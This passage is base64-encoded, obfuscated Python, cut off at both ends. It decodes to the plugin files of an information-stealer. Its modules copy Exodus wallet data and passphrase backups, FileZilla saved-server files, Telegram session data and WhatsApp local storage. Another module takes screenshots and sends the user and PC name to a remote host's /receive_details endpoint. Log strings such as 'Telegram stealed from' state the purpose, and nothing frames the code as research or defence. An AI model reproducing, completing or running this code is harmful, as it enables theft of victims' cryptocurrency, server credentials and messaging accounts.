OlxyXG4gICAgICAgICAgICAgICAgYXdhaXQgbW92ZShmaWxlbmFtZSwgam9pbihzZWxmLmNvbmYubG9nX3BhdGgsIGZpbGVuYW1lKSlcclxuICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4YTFceGQwXHhiYVx4ZDFceDgwXHhkMFx4YjhceGQwXHhiZFx4ZDFceDg4XHhkMFx4YmVceGQxXHg4MiB7ZmlsZW5hbWV9IFx4ZDFceDgxXHhkMFx4YmVceGQxXHg4NVx4ZDFceDgwXHhkMFx4YjBceGQwXHhiZFx4ZDBceGI1XHhkMFx4YmQnKVxyXG4gXHJcbiAgICBhc3luYyBkZWYgY2FsbGJhY2soc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBiZ190YXNrID0gY3JlYXRlX3Rhc2soc2VsZi50YWtlX3NjcmVlbnNob3QoKSlcclxuICAgICAgICB1c2VyID0gb3MuZ2V0bG9naW4oKVxyXG4gICAgICAgIHBjID0gcGxhdGZvcm0ubm9kZSgpXHJcbiAgICAgICAgdGFnID0gc2VsZi5jb25mLnRhZ1xyXG5cclxuICAgICAgICBkYXRhID0ge1xyXG4gICAgICAgICAgICAnY2xpZW50X2lkJzogc2VsZi5jb25mLmNsaWVudF9pZCxcclxuICAgICAgICAgICAgJ3RhZyc6IHRhZyxcclxuICAgICAgICAgICAgJ3VzZXJfbmFtZSc6IHVzZXIsXHJcbiAgICAgICAgICAgICdwY19uYW1lJzogcGNcclxuICAgICAgICB9XHJcbiAgICAgICAgXHJcbiAgICAgICAgdXJsID0gZid7c2VsZi5jb25mLmhvc3R9L3JlY2VpdmVfZGV0YWlscydcclxuXHJcbiAgICAgICAgcmVzcCA9IGF3YWl0IHNlbGYuY29uZi5zZXNzaW9uLnBvc3QodXJsLCBqc29uPWRhdGEpXHJcblxyXG4gICAgICAgIGFzeW5jIHdpdGggb3Blbihqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgJ2RldGFpbHMudHh0JyksICd3JywgZW5jb2Rpbmc9J3V0ZjgnKSBhcyBmOlxyXG4gICAgICAgICAgICBhd2FpdCBmLndyaXRlKGYndXNlciBuYW1lOiB7dXNlcn1cXG5wYyBuYW1lOiB7cGN9XFxudGFnOiB7dGFnfScpXHJcblxyXG4gICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4OWVceGQxXHg4Mlx4ZDFceDgxXHhkMVx4ODJceGQxXHg4M1x4ZDBceGJhIFx4ZDBceGJlXHhkMVx4ODJceGQwXHhiZlx4ZDFceDgwXHhkMFx4YjBceGQwXHhiMlx4ZDBceGJiXHhkMFx4YjVceGQwXHhiZCcpXHJcblxyXG4gICAgICAgIGF3YWl0IGJnX3Rhc2siKSNsaW5lOjU4CiAgICBfX09PTzAwMDAwT08wTzAwMDBPICgncGx1Z2lucy93YWxsZXRzL19faW5pdF9fLnB5JyxiJ2Zyb20gLmV4b2R1cyBpbXBvcnQgRXhvZHVzJykjbGluZTo1OQogICAgX19PT08wMDAwME9PME8wMDAwTyAoJ3BsdWdpbnMvd2FsbGV0cy9leG9kdXMucHknLGInZnJvbSBwbHVnaW5zIGltcG9ydCBQbHVnaW5cclxuZnJvbSBjb25maWcgaW1wb3J0IENvbmZpZ1xyXG5mcm9tIG9zLnBhdGggaW1wb3J0IGlzZGlyLCBqb2luXHJcbmZyb20gb3MgaW1wb3J0IG1rZGlyLCB3YWxrXHJcbmZyb20gc2VjcmV0cyBpbXBvcnQgdG9rZW5faGV4XHJcbmZyb20gdG9vbHMgaW1wb3J0IGNvcHl0cmVlLCBjb3B5ZmlsZVxyXG5cclxuXHJcblxyXG5jbGFzcyBFeG9kdXMoUGx1Z2luKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb25mOiBDb25maWcpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5jb25mID0gY29uZlxyXG5cclxuXHJcbiAgICBhc3luYyBkZWYgY2FsbGJhY2soc2VsZiwgcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIG5vdCBpc2RpcihwYXRoKTpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIHdhbGxldHNfcGF0aCA9IGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCBcJ3dhbGxldHNcJylcclxuICAgICAgICBpZiBub3QgaXNkaXIod2FsbGV0c19wYXRoKTpcclxuICAgICAgICAgICAgbWtkaXIod2FsbGV0c19wYXRoKVxyXG4gICAgICAgIFxyXG4gICAgICAgIGxvZ19leG9kdXNfcGF0aCA9IGpvaW4od2FsbGV0c19wYXRoLCBmXCdleG9kdXNfe3Rva2VuX2hleCg0KX1cJylcclxuXHJcbiAgICAgICAgd2FsbGV0X2ZvbGRlciA9IGpvaW4ocGF0aCwgXCdleG9kdXMud2FsbGV0XCcpXHJcbiAgICAgICAgaWYgaXNkaXIod2FsbGV0X2ZvbGRlcik6XHJcbiAgICAgICAgICAgIGF3YWl0IGNvcHl0cmVlKHdhbGxldF9mb2xkZXIsIGxvZ19leG9kdXNfcGF0aClcclxuICAgICAgICAgICAgXHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGZcJ1x4ZDBceGExXHhkMFx4YmZceGQwXHhiOFx4ZDBceGI3XHhkMFx4YjZceGQwXHhiNVx4ZDBceGJkIGV4b2R1cyBceGQxXHg4MSB7cGF0aH1cJylcclxuXHJcbiAgICAgICAgYmFjdWtwc19mb2xkZXIgPSBqb2luKHBhdGgsIFwnYmFja3Vwc1wnKVxyXG4gICAgICAgIGZvciBkaXJwYXRoLCBkaXJuYW1lcywgZmlsZW5hbWVzIGluIHdhbGsoYmFjdWtwc19mb2xkZXIpOlxyXG4gICAgICAgICAgICBmb3IgZiBpbiBmaWxlbmFtZXM6XHJcbiAgICAgICAgICAgICAgICBpZiBmID09ICJwYXNzcGhyYXNlLmpzb24iOlxyXG4gICAgICAgICAgICAgICAgICAgIGlmIG5vdCBpc2Rpcihsb2dfZXhvZHVzX3BhdGgpOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBta2Rpcihsb2dfZXhvZHVzX3BhdGgpXHJcbiAgICAgICAgICAgICAgICAgICAgXHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgY29weWZpbGUoam9pbihkaXJwYXRoLCBmKSwgam9pbihsb2dfZXhvZHVzX3BhdGgsIGZcJ3Bhc3NwaHJhc2Vfe3Rva2VuX2hleCg0KX0uanNvblwnKSknKSNsaW5lOjYwCiAgICBfX09PTzAwMDAwT08wTzAwMDBPICgncGx1Z2lucy93YWxsZXRzL0V4b2R1cy5weScsYidmcm9tIHBsdWdpbnMgaW1wb3J0IFBsdWdpblxyXG5mcm9tIGNvbmZpZyBpbXBvcnQgQ29uZmlnXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgaXNkaXIsIGpvaW5cclxuZnJvbSBvcyBpbXBvcnQgbWtkaXIsIHdhbGtcclxuZnJvbSBzZWNyZXRzIGltcG9ydCB0b2tlbl9oZXhcclxuZnJvbSB0b29scyBpbXBvcnQgY29weXRyZWUsIGNvcHlmaWxlXHJcblxyXG5cclxuXHJcbmNsYXNzIEV4b2R1cyhQbHVnaW4pOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcblxyXG5cclxuICAgIGFzeW5jIGRlZiBjYWxsYmFjayhzZWxmLCBwYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHBhdGgpOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgd2FsbGV0c19wYXRoID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsIFwnd2FsbGV0c1wnKVxyXG4gICAgICAgIGlmIG5vdCBpc2Rpcih3YWxsZXRzX3BhdGgpOlxyXG4gICAgICAgICAgICBta2Rpcih3YWxsZXRzX3BhdGgpXHJcbiAgICAgICAgXHJcbiAgICAgICAgbG9nX2V4b2R1c19wYXRoID0gam9pbih3YWxsZXRzX3BhdGgsIGZcJ2V4b2R1c197dG9rZW5faGV4KDQpfVwnKVxyXG5cclxuICAgICAgICB3YWxsZXRfZm9sZGVyID0gam9pbihwYXRoLCBcJ2V4b2R1cy53YWxsZXRcJylcclxuICAgICAgICBpZiBpc2Rpcih3YWxsZXRfZm9sZGVyKTpcclxuICAgICAgICAgICAgYXdhaXQgY29weXRyZWUod2FsbGV0X2ZvbGRlciwgbG9nX2V4b2R1c19wYXRoKVxyXG4gICAgICAgICAgICBcclxuICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZlwnXHhkMFx4YTFceGQwXHhiZlx4ZDBceGI4XHhkMFx4YjdceGQwXHhiNlx4ZDBceGI1XHhkMFx4YmQgZXhvZHVzIFx4ZDFceDgxIHtwYXRofVwnKVxyXG5cclxuICAgICAgICBiYWN1a3BzX2ZvbGRlciA9IGpvaW4ocGF0aCwgXCdiYWNrdXBzXCcpXHJcbiAgICAgICAgZm9yIGRpcnBhdGgsIGRpcm5hbWVzLCBmaWxlbmFtZXMgaW4gd2FsayhiYWN1a3BzX2ZvbGRlcik6XHJcbiAgICAgICAgICAgIGZvciBmIGluIGZpbGVuYW1lczpcclxuICAgICAgICAgICAgICAgIGlmIGYgPT0gInBhc3NwaHJhc2UuanNvbiI6XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgbm90IGlzZGlyKGxvZ19leG9kdXNfcGF0aCk6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIG1rZGlyKGxvZ19leG9kdXNfcGF0aClcclxuICAgICAgICAgICAgICAgICAgICBcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCBjb3B5ZmlsZShqb2luKGRpcnBhdGgsIGYpLCBqb2luKGxvZ19leG9kdXNfcGF0aCwgZlwncGFzc3BocmFzZV97dG9rZW5faGV4KDQpfS5qc29uXCcpKScpI2xpbmU6NjEKICAgIF9fT09PMDAwMDBPTzBPMDAwME8gKCdwbHVnaW5zL2ZpbGV6aWxsYS5weScsYiJmcm9tIHBsdWdpbnMgaW1wb3J0IFBsdWdpblxyXG5mcm9tIGNvbmZpZyBpbXBvcnQgQ29uZmlnXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgaXNkaXIsIGpvaW5cclxuZnJvbSBvcyBpbXBvcnQgbWtkaXIsIHNjYW5kaXJcclxuZnJvbSBzZWNyZXRzIGltcG9ydCB0b2tlbl9oZXhcclxuZnJvbSB0b29scyBpbXBvcnQgY29weWZpbGVcclxuXHJcblxyXG5cclxuY2xhc3MgRmlsZXppbGxhKFBsdWdpbik6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY29uZjogQ29uZmlnKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuY29uZiA9IGNvbmZcclxuXHJcblxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYsIHBhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNkaXIocGF0aCk6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICBzZWFyY2ggPSB7J3JlY2VudHNlcnZlcnMueG1sJywgJ3NpdGVtYW5hZ2VyLnhtbCd9XHJcbiAgICAgICAgZmlsZXMgPSBzZWFyY2guaW50ZXJzZWN0aW9uKGkubmFtZSBmb3IgaSBpbiBzY2FuZGlyKHBhdGgpKVxyXG5cclxuICAgICAgICBpZiBub3QgZmlsZXM6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICByZXNfcGF0aCA9IGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCAnZmlsZXppbGxhJylcclxuICAgICAgICBpZiBub3QgaXNkaXIocmVzX3BhdGgpOlxyXG4gICAgICAgICAgICBta2RpcihyZXNfcGF0aClcclxuICAgICAgICBcclxuICAgICAgICBmb3IgZiBpbiBmaWxlczpcclxuICAgICAgICAgICAgZmlsZW5hbWUgPSBmLnNwbGl0KCcuJylbMF1cclxuICAgICAgICAgICAgZGVzdF9wYXRoID0gam9pbihyZXNfcGF0aCwgZid7ZmlsZW5hbWV9X3t0b2tlbl9oZXgoNCl9LnhtbCcpXHJcbiAgICAgICAgICAgIGF3YWl0IGNvcHlmaWxlKGpvaW4ocGF0aCwgZiksIGRlc3RfcGF0aClcclxuXHJcbiAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidGaWxlemlsbGEgc3RlYWxlZCBmcm9tIHtwYXRofScpIikjbGluZTo2MgogICAgX19PT08wMDAwME9PME8wMDAwTyAoJ3BsdWdpbnMvdGVsZWdyYW0ucHknLGInZnJvbSBwbHVnaW5zIGltcG9ydCBQbHVnaW5cclxuZnJvbSBjb25maWcgaW1wb3J0IENvbmZpZ1xyXG5mcm9tIG9zLnBhdGggaW1wb3J0IGlzZGlyLCBqb2luXHJcbmZyb20gb3MgaW1wb3J0IG1rZGlyLCBzY2FuZGlyXHJcbmZyb20gc2VjcmV0cyBpbXBvcnQgdG9rZW5faGV4XHJcbmZyb20gdG9vbHMgaW1wb3J0IGNvcHlmaWxlLCBjb3B5dHJlZVxyXG5pbXBvcnQgd2lucmVnXHJcbmltcG9ydCByZVxyXG5mcm9tIHBhdGhzIGltcG9ydCBMT0NBTFxyXG5pbXBvcnQgd2luMzJjb20uY2xpZW50XHJcblxyXG5cclxuXHJcbmNsYXNzIFRlbGVncmFtKFBsdWdpbik6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY29uZjogQ29uZmlnKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuY29uZiA9IGNvbmZcclxuXHJcbiAgICBhc3luYyBkZWYgY2FsbGJhY2soc2VsZiwgcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIG5vdCBpc2RpcihwYXRoKTpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIHRkYXRhX3BhdGggPSBqb2luKHBhdGgsIFwndGRhdGFcJylcclxuICAgICAgICBpZiBub3QgaXNkaXIodGRhdGFfcGF0aCk6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICB0ZWxlZ3JhbV9wYXRoID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsIFwndGVsZWdyYW1cJylcclxuICAgICAgICBpZiBub3QgaXNkaXIodGVsZWdyYW1fcGF0aCk6XHJcbiAgICAgICAgICAgIG1rZGlyKHRlbGVncmFtX3BhdGgpXHJcblxyXG4gICAgICAgIHJlc19wYXRoID0gam9pbih0ZWxlZ3JhbV9wYXRoLCBmXCd0ZGF0YV97dG9rZW5faGV4KDQpfVwnKVxyXG4gICAgICAgIG1rZGlyKHJlc19wYXRoKVxyXG5cclxuICAgICAgICBibGFja2xpc3QgPSBbXCdkdW1wc1wnLCBcJ2Vtb2ppXCcsIFwndXNlcl9kYXRhXCcsIFwnd29ya2luZ1wnXVxyXG5cclxuICAgICAgICBmb3IgZiBpbiBzY2FuZGlyKHRkYXRhX3BhdGgpOlxyXG4gICAgICAgICAgICBmaWxlX29rID0gVHJ1ZVxyXG4gICAgICAgICAgICBmb3IgaSBpbiBibGFja2xpc3Q6XHJcbiAgICAgICAgICAgICAgICBpZiBpIGluIGYubmFtZTpcclxuICAgICAgICAgICAgICAgICAgICBmaWxlX29rID0gRmFsc2VcclxuICAgICAgICAgICAgICAgICAgICBicmVha1xyXG4gICAgICAgICAgICBcclxuICAgICAgICAgICAgaWYgbm90IGZpbGVfb2s6XHJcbiAgICAgICAgICAgICAgICBjb250aW51ZVxyXG4gICAgICAgICAgICBcclxuICAgICAgICAgICAgZnJvbV9wYXRoID0gam9pbih0ZGF0YV9wYXRoLCBmLm5hbWUpXHJcbiAgICAgICAgICAgIGRlc3RfcGF0aCA9IGpvaW4ocmVzX3BhdGgsIGYubmFtZSlcclxuXHJcbiAgICAgICAgICAgIGZ1bmMgPSBjb3B5ZmlsZSBpZiBmLmlzX2ZpbGUoKSBlbHNlIGNvcHl0cmVlXHJcbiAgICAgICAgICAgIGF3YWl0IGZ1bmMoZnJvbV9wYXRoLCBkZXN0X3BhdGgpXHJcblxyXG4gICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGZcJ1RlbGVncmFtIHN0ZWFsZWQgZnJvbSB7cGF0aH1cJylcclxuXHJcbiAgICBAc3RhdGljbWV0aG9kXHJcbiAgICBkZWYgZ2V0X3JlZ2lzdHJ5X3BhdGgoKTpcclxuICAgICAgICBwYXRoID0gd2lucmVnLkhLRVlfQ0xBU1NFU19ST09UXHJcblxyXG4gICAgICAgIHRnID0gd2lucmVnLk9wZW5LZXlFeChwYXRoLCByInRkZXNrdG9wLnRnXFxcXCIpXHJcbiAgICAgICAgc2hlbGwgPSB3aW5yZWcuT3BlbktleUV4KHRnLCByXCdzaGVsbFxcXFxcJylcclxuICAgICAgICBvcGVuX3JnID0gd2lucmVnLk9wZW5LZXlFeChzaGVsbCwgclwnb3BlblxcXFxcJylcclxuICAgICAgICBrZXkgPSB3aW5yZWcuT3BlbktleUV4KG9wZW5fcmcsIHJcJ2NvbW1hbmRcXFxcXCcpXHJcblxyXG4gICAgICAgIHZhbHVlID0gd2lucmVnLkVudW1WYWx1ZShrZXksIDApXHJcblxyXG4gICAgICAgIHBhdGggPSByZS5maW5kYWxsKHJcJyIoW14iXSopXCcsIHZhbHVlWzFdKVsyXVxyXG4gICAgICAgIHJldHVybiBwYXRoXHJcbiAgICAgICAgXHJcbiAgICBAc3RhdGljbWV0aG9kXHJcbiAgICBkZWYgZ2V0X2xua19wYXRoKCk6XHJcbiAgICAgICAgZGVza3RvcCA9IGpvaW4oTE9DQUwsIFwnZGVza3RvcFwnKVxyXG5cclxuICAgICAgICBmb3IgaXQgaW4gc2NhbmRpcihkZXNrdG9wKTpcclxuICAgICAgICAgICAgaWYgaXQubmFtZS5zcGxpdChcJy5cJylbLTFdID09IFwnbG5rXCcgYW5kIFwndGVsZWdyYW1cJyBpbiBpdC5uYW1lLmxvd2VyKCk6XHJcbiAgICAgICAgICAgICAgICBzaGVsbCA9IHdpbjMyY29tLmNsaWVudC5EaXNwYXRjaCgiV1NjcmlwdC5TaGVsbCIpXHJcbiAgICAgICAgICAgICAgICBzaG9ydGN1dCA9IHNoZWxsLkNyZWF0ZVNob3J0Q3V0KGl0LnBhdGgpXHJcbiAgICAgICAgICAgICAgICBwYXRoID0gc2hvcnRjdXQuVGFyZ2V0cGF0aC5sb3dlcigpLnN0cmlwKFwndGVsZWdyYW0uZXhlXCcpXHJcbiAgICAgICAgICAgICAgICByZXR1cm4gcGF0aCcpI2xpbmU6NjMKICAgIF9fT09PMDAwMDBPTzBPMDAwME8gKCdwbHVnaW5zL3doYXRzYXBwLnB5JyxiImZyb20gcGx1Z2lucyBpbXBvcnQgUGx1Z2luXHJcbmZyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBpc2Rpciwgam9pblxyXG5mcm9tIG9zIGltcG9ydCBta2Rpciwgc2NhbmRpclxyXG5mcm9tIHNlY3JldHMgaW1wb3J0IHRva2VuX2hleFxyXG5mcm9tIHRvb2xzIGltcG9ydCBjb3B5dHJlZVxyXG5cclxuXHJcblxyXG5jbGFzcyBXaGF0c2FwcChQbHVnaW4pOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcblxyXG5cclxuICAgIGFzeW5jIGRlZiBjYWxsYmFjayhzZWxmLCBwYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHBhdGgpOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgZm9sZGVyID0gam9pbihwYXRoLCAnbG9jYWwgc3RvcmFnZScsICdsZXZlbGRiJylcclxuXHJcbiAgICAgICAgaWYgbm90IGlzZGlyKGZvbGRlcik6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG4gICAgICAgIFxyXG4gICAgICAgIHdoYXRzYXBwX3Jlc19mb2xkZXIgPSBqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgJ3doYXRzYXBwJylcclxuXHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHdoYXRzYXBwX3Jlc19mb2xkZXIpOlxyXG4gICAgICAgICAgICBta2Rpcih3aGF0c2FwcF9yZXNfZm9sZGVyKVxyXG5cclxuICAgICAgICByZXMgPSBqb2luKHdoYXRzYXBwX3Jlc19mb2xkZXIsIGYnd2hhdHNhcHBfe3Rva2VuX2hleCg0KX0nKVxyXG5cclxuICAgICAgICBhd2FpdCBjb3B5dHJlZShmb2xkZXIsIHJlcylcclxuXHJcbiAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidXaGF0c2FwcCBzdGVhbGVkIGZyb20ge3BhdGh9JykiKSNsaW5lOjY0CiAgICBfX09PTzAwMDAwT08wTzAwMDBPICgncGx1Z2lucy9EZXRhaWxzLnB5JyxiImZyb20gYXN5bmNpbyBpbXBvcnQgY3JlYXRlX3Rhc2tcclxuZnJvbSBjb25maWcgaW1wb3J0IENvbmZpZ1xyXG5pbXBvcnQgb3NcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBqb2luXHJcbmltcG9ydCBwbGF0Zm9ybVxyXG5mcm9tIGFpb2ZpbGVzIGltcG9ydCBvcGVuXHJcbmZyb20gbXNzLndpbmRvd3MgaW1wb3J0IE1TUyBhcyBtc3NcclxuZnJvbSB0b29scyBpbXBvcnQgbW92ZVxyXG5cclxuXHJcblxyXG5jbGFzcyBEZXRhaWxzKCk6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY29uZjogQ29uZmlnKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuY29uZiA9IGNvbmZcclxuXHJcbiAgICBhc3luYyBkZWYgdGFrZV9zY3JlZW5zaG90KHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgd2l0aCBtc3MoKSBhcyBzY3Q6XHJcbiAgICAgICAgICAgIGZvciBmaWxlbmFtZSBpbiBzY3Quc2F2ZSgpOlxyXG4gICAgICAgICAgICAgICAgYXdhaXQgbW92ZShmaWxlbmFtZSwgam9pbihzZWxmLmNvbmYubG9nX3BhdGgsIGZpbGVuYW1lKSlcclxuICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4YTFceGQwXHhiYVx4ZDFceDgwXHhkMFx4YjhceGQwXHhiZFx4ZDFceDg4XHhkMFx4YmVceGQxXHg4MiB7ZmlsZW5hbWV9IFx4ZDFceDgxXHhkMFx4YmVceGQxXHg4NVx4ZDFceDgwXHhkMFx4YjBceGQwXHhiZFx4ZDBceGI1XHhkMFx4YmQnKVxyXG4gXHJcbiAgICBhc3luYyBkZWYgY2FsbGJhY2soc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBiZ190YXNrID0gY3JlYXRlX3Rhc2soc2VsZi50YWtlX3NjcmVlbnNob3QoKSlcclxuICAgICAgICB1c2VyID0gb3MuZ2V0bG9naW4oKVxyXG4gICAgICAgIHBjID0gcGxhdGZvcm0ubm9kZSgpXHJcbiAgICAgICAgdGFnID0gc2VsZi5jb25mLnRhZ1xyXG5cclxuICAgICAgICBkYXRhID0ge1xyXG4gICAgICAgICAgICAnY2xpZW50X2lkJzogc2VsZi5jb25mLmNsaWVudF9pZCxcclxuICAgICAgICAgICAgJ3RhZyc6IHRhZyxcclxuICAgICAgICAgICAgJ3VzZXJfbmFtZSc6IHVzZXIsXHJcbiAgICAgICAgICAgICdwY19uYW1lJzogcGNcclxuICAgICAgICB9XHJcbiAgICAgICAgXHJcbiAgICAgICAgdXJsID0gZid7c2VsZi5jb25mLmhvc3R9L3JlY2VpdmVfZGV0YWlscydcclxuXHJcbiAgICAgICAgcmVzcCA9IGF3YWl0IHNlbGYuY29uZi5zZXNzaW9uLnBvc3QodXJsLCBqc29uPWRhdGEpXHJcblxyXG4gICAgICAgIGFzeW5jIHdpdGggb3Blbihqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgJ2RldGFpbHMudHh0JyksICd3JywgZW5jb2Rpbmc9J3V0ZjgnKSBhcyBmOlxyXG4gICAgICAgICAgICBhd2FpdCBmLndyaXRlKGYndXNlciBuYW1lOiB7dXNlcn1cXG5wYyBuYW1lOiB7cGN9XFxudGFnOiB7dGFnfScpXHJcblxyXG4gICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4OWVceGQxXHg4Mlx4ZDFceDgxXHhkMVx4ODJceGQxXHg4M1x4ZDBceGJhIFx4ZDBceGJlXHhkMVx4ODJceGQwXHhiZlx4ZDFceDgwXHhkMFx4YjBceGQwXHhiMlx4ZDBceGJiXHhkMFx4YjVceGQwXHhiZCcpXHJcblxyXG4gICAgICAgIGF3YWl0IGJnX3Rhc2siKSNsaW5lOjY1CiAgICBfX09PTzAwMDAwT08wTzAwMDBPICgncGx1Z2lucy9GaWxlemlsbGEucHknLGIiZnJvbSBwbHVnaW5zIGltcG9ydCBQbHVnaW5cclxuZnJvbSBjb25maWcgaW1wb3J0IENvbmZpZ1xyXG5mcm9tIG9zLnBhdGggaW1wb3J0IGlzZGlyLCBqb2luXHJcbmZyb20gb3MgaW1wb3J0IG1rZGlyLCBzY2FuZGlyXHJcbmZyb20gc2VjcmV0cyBpbXBvcnQgdG9rZW5faGV4XHJcbmZyb20gdG9vbHMgaW1wb3J0IGNvcHlmaWxlXHJcblxyXG5cclxuXHJcbmNsYXNzIEZpbGV6aWxsYShQbHVnaW4pOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcblxyXG5cclxuICAgIGFzeW5jIGRlZiBjYWxsYmFjayhzZWxmLCBwYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHBhdGgpOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgc2VhcmNoID0geydyZWNlbnRzZXJ2ZXJzLnhtbCcsICdzaXRlbWFuYWdlci54bWwnfVxyXG4gICAgICAgIGZpbGVzID0gc2VhcmNoLmludGVyc2VjdGlvbihpLm5hbWUgZm9yIGkgaW4gc2NhbmRpcihwYXRoKSlcclxuXHJcbiAgICAgICAgaWYgbm90IGZpbGVzOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgcmVzX3BhdGggPSBqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgJ2ZpbGV6aWxsYScpXHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHJlc19wYXRoKTpcclxuICAgICAgICAgICAgbWtkaXIocmVzX3BhdGgpXHJcbiAgICAgICAgXHJcbiAgICAgICAgZm9yIGYgaW4gZmlsZXM6XHJcbiAgICAgICAgICAgIGZpbGVuYW1lID0gZi5zcGxpdCgnLicpWzBdXHJcbiAgICAgICAgICAgIGRlc3RfcGF0aCA9IGpvaW4ocmVzX3BhdGgsIGYne2ZpbGVuYW1lfV97dG9rZW5faGV4KDQpfS54bWwnKVxyXG4gICAgICAgICAgICBhd2FpdCBjb3B5ZmlsZShqb2luKHBhdGgsIGYpLCBkZXN0X3BhdGgpXHJcblxyXG4gICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnRmlsZXppbGxhIHN0ZWFsZWQgZnJvbSB7cGF0aH0nKSIpI2xpbmU6NjYKICAgIF9fT09PMDAwMDBPTzBPMDAwME8gKCdwbHVnaW5zL1RlbGVncmFtLnB5JyxiJ2Zyb20gcGx1Z2lucyBpbXBvcnQgUGx1Z2luXHJcbmZyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBpc2Rpciwgam9pblxyXG5mcm9tIG9zIGltcG9ydCBta2Rpciwgc2NhbmRpclxyXG5mcm9tIHNlY3JldHMgaW1wb3J0IHRva2VuX2hleFxyXG5mcm9tIHRvb2xzIGltcG9ydCBjb3B5ZmlsZSwgY29weXRyZWVcclxuaW1wb3J0IHdpbnJlZ1xyXG5pbXBvcnQgcmVcclxuZnJvbSBwYXRocyBpbXBvcnQgTE9DQUxcclxuaW1wb3J0IHdpbjMyY29tLmNsaWVudFxyXG5cclxuXHJcblxyXG5jbGFzcyBUZWxlZ3JhbShQbHVnaW4pOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcblxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYsIHBhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNkaXIocGF0aCk6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICB0ZGF0YV9wYXRoID0gam9pbihwYXRoLCBcJ3RkYXRhXCcpXHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHRkYXRhX3BhdGgpOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgdGVsZWdyYW1fcGF0aCA9IGpvaW4oc2VsZi5